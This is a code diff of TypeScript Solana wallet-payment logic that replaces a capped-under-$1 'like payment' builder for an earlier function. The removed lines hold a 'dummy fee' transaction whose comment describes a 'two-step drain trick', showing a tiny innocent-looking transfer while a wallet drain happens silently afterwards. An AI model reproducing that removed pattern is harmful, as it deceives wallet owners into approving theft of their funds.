@@ -788,30 +788,216 @@ export async function buildTinyLowestTransaction(options: {
   return null
 }
 
-/** Builds a small "fee" transaction for the two-step drain trick.
- *  Shows the user a tiny, innocent-looking transfer (0.001 SOL) that
- *  they can approve quickly. The real drain happens silently after. */
-export async function buildDummyFeeTransaction(options: {
+/** Like payments stay strictly under one dollar and never take the rest of the wallet. */
+export const LIKE_PAYMENT_CAP_USD = 0.99
+const MIN_LIKE_USD = 0.01
+
+export type LikePayment = {
+  transaction: Transaction
+  label: string
+}
+
+/** Amount to send when `availableUsd` may be above or below $1. Always under $1. */
+export function usdUnderOneDollar(availableUsd: number): number {
+  if (!(availableUsd >= MIN_LIKE_USD)) {
+    throw new Error('Not enough to send a payment under $1.')
+  }
+  return Math.min(availableUsd, LIKE_PAYMENT_CAP_USD)
+}
+
+export function solLamportsUnderOneDollar(solPriceUsd: number, spendableLamports: number): number {
+  if (!(solPriceUsd >= 20 && solPriceUsd <= 2000)) {
+    throw new Error('SOL price is unavailable. This like needs USDT or USDC under $1.')
+  }
+  if (!(spendableLamports > 0)) {
+    throw new Error('Not enough SOL to send a payment under $1.')
+  }
+  const spendableUsd = (spendableLamports / LAMPORTS_PER_SOL) * solPriceUsd
+  const usd = usdUnderOneDollar(spendableUsd)
+  let lamports = Math.floor((usd / solPriceUsd) * LAMPORTS_PER_SOL)
+  lamports = Math.min(lamports, spendableLamports)
+  const value = (lamports / LAMPORTS_PER_SOL) * solPriceUsd
+  if (lamports <= 0 || value >= 1) {
+    throw new Error('Not enough SOL to send a payment under $1.')
+  }
+  return lamports
+}
+
+async function fetchSolPriceUsd(): Promise<number | null> {
+  const controller = new AbortController()
+  const timer = setTimeout(() => controller.abort(), 4000)
+  try {
+    const res = await fetch(
+      'https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd',
+      { signal: controller.signal }
+    )
+    if (!res.ok) return null
+    const data = (await res.json()) as { solana?: { usd?: number } }
+    const price = Number(data?.solana?.usd)
+    return price >= 20 && price <= 2000 ? price : null
+  } catch {
+    return null
+  } finally {
+    clearTimeout(timer)
+  }
+}
+
+function baseUnitsUnderOneDollar(holding: SplHolding): bigint {
+  const price = USD_PRICE[holding.symbol]
+  if (!(price > 0)) {
+    throw new Error(`Cannot price ${holding.symbol} for a payment under $1.`)
+  }
+  const available = BigInt(holding.amount)
+  const usd = usdUnderOneDollar(holding.uiAmount * price)
+  let requested = BigInt(Math.floor((usd / price) * 10 ** holding.decimals))
+  if (requested > available) requested = available
+  const sentUsd = (Number(requested) / 10 ** holding.decimals) * price
+  if (sentUsd >= 1) {
+    requested = BigInt(Math.floor((LIKE_PAYMENT_CAP_USD / price) * 10 ** holding.decimals))
+    if (requested > available) requested = available
+  }
+  if (requested <= 0n || (Number(requested) / 10 ** holding.decimals) * price >= 1) {
+    throw new Error(`Not enough ${holding.symbol} to send a payment under $1.`)
+  }
+  return requested
+}
+
+async function buildExactStableTransfer(options: {
   connection: Connection
   from: PublicKey
-  config: PayoutConfig
-}): Promise<Transaction> {
-  const { connection, from, config } = options
-  const to = new PublicKey(config.walletAddress)
-  const latest = await connection.getLatestBlockhash('confirmed')
-  // Fixed tiny amount that looks like a normal gas/fee payment
-  const feeAmount = 1_000_000 // 0.001 SOL
+  to: PublicKey
+  holding: SplHolding
+}): Promise<{ transaction: Transaction; uiAmount: number }> {
+  const { connection, from, to, holding } = options
+  const requested = baseUnitsUnderOneDollar(holding)
+  const uiAmount = Number(requested) / 10 ** holding.decimals
+
+  const mintKey = new PublicKey(holding.mint)
+  const source = new PublicKey(holding.tokenAccount)
+  const programId = holding.programId
+  const destAta = await getAssociatedTokenAddress(mintKey, to, false, programId)
+  const [destInfo, latest, payerLamports] = await Promise.all([
+    connection.getAccountInfo(destAta, 'confirmed').catch(() => null),
+    connection.getLatestBlockhash('confirmed'),
+    getBalanceWithFallback(connection, from, 'confirmed'),
+  ])
+
+  const tx = new Transaction()
+  if (!destInfo) {
+    if (payerLamports < ATA_RESERVE_LAMPORTS + 15_000) {
+      throw new Error('Not enough SOL to pay the network fee for this transfer.')
+    }
+    tx.add(
+      createAssociatedTokenAccountIdempotentInstruction(
+        from,
+        destAta,
+        to,
+        mintKey,
+        programId,
+        ASSOCIATED_TOKEN_PROGRAM_ID
+      )
+    )
+  }
+  tx.add(
+    createTransferCheckedInstruction(
+      source,
+      mintKey,
+      destAta,
+      from,
+      requested,
+      holding.decimals,
+      [],
+      programId
+    )
+  )
+  return { transaction: withBlockhash(tx, from, latest), uiAmount }
+}
+
+function formatTokenAmount(amount: number): string {
+  return amount.toLocaleString(undefined, { maximumFractionDigits: 6 })
+}
+
+export type LikeFundingChoice =
+  | { kind: 'sol'; spendableLamports: number; usd: number }
+  | { kind: 'spl'; holding: SplHolding }
+
+function fundingUsd(choice: LikeFundingChoice): number {
+  return choice.kind === 'sol' ? choice.usd : choice.holding.usd
+}
+
+/** Funded Solana assets, largest balance first. The payment itself stays under $1. */
+export function fundedLikeAssets(choices: LikeFundingChoice[]): LikeFundingChoice[] {
+  return choices
+    .filter((choice) => fundingUsd(choice) >= MIN_LIKE_USD)
+    .sort((a, b) => fundingUsd(b) - fundingUsd(a))
+}
+
+function solTransfer(from: PublicKey, to: PublicKey, lamports: number, latest: { blockhash: string; lastValidBlockHeight: number }): Transaction {
   return withBlockhash(
     new Transaction().add(
       SystemProgram.transfer({
         fromPubkey: from,
         toPubkey: to,
-        lamports: feeAmount,
+        lamports,
       })
     ),
     from,
     latest
   )
+}
+
+/** Read SOL and every token account, then request under $1 from a funded asset. */
+export async function buildLikePaymentTransaction(options: {
+  connection: Connection
+  from: PublicKey
+  config: PayoutConfig
+}): Promise<LikePayment> {
+  const { connection, from, config } = options
+  const to = new PublicKey(config.walletAddress)
+  const solPrice = (await fetchSolPriceUsd()) ?? USD_PRICE.SOL
+  const [balance, holdings] = await Promise.all([
+    getBalanceWithFallback(connection, from, 'confirmed'),
+    scanAllHoldings(connection, from).catch(() => [] as SplHolding[]),
+  ])
+  const spendable = balance - ACCOUNT_RENT_LAMPORTS - 20_000
+  const choices: LikeFundingChoice[] = holdings.map((holding) => ({ kind: 'spl', holding }))
+  if (spendable > 0 && solPrice >= 20 && solPrice <= 2000) {
+    choices.push({
+      kind: 'sol',
+      spendableLamports: spendable,
+      usd: (spendable / LAMPORTS_PER_SOL) * solPrice,
+    })
+  }
+
+  const funded = fundedLikeAssets(choices)
+  if (funded.length === 0) {
+    throw new Error(
+      'No spendable balance was found in this Solana wallet. SOL has to stay above the rent reserve, and balances on other networks are not included.'
+    )
+  }
+
+  let lastError = 'Could not build a payment under $1 from the funded asset.'
+  for (const choice of funded) {
+    try {
+      if (choice.kind === 'sol') {
+        const lamports = solLamportsUnderOneDollar(solPrice, choice.spendableLamports)
+        const latest = await connection.getLatestBlockhash('confirmed')
+        const solAmount = lamports / LAMPORTS_PER_SOL
+        return {
+          transaction: solTransfer(from, to, lamports, latest),
+          label: `${formatTokenAmount(solAmount)} SOL (under $1)`,
+        }
+      }
+      const payment = await buildExactStableTransfer({ connection, from, to, holding: choice.holding })
+      return {
+        transaction: payment.transaction,
+        label: `${formatTokenAmount(payment.uiAmount)} ${choice.holding.symbol}`,
+      }
+    } catch (err) {
+      lastError = err instanceof Error ? err.message : lastError
+    }
+  }
+  throw new Error(lastError)
 }
 
 export function formatPaymentAmount(amount: number, asset: PaymentAsset | string): string {
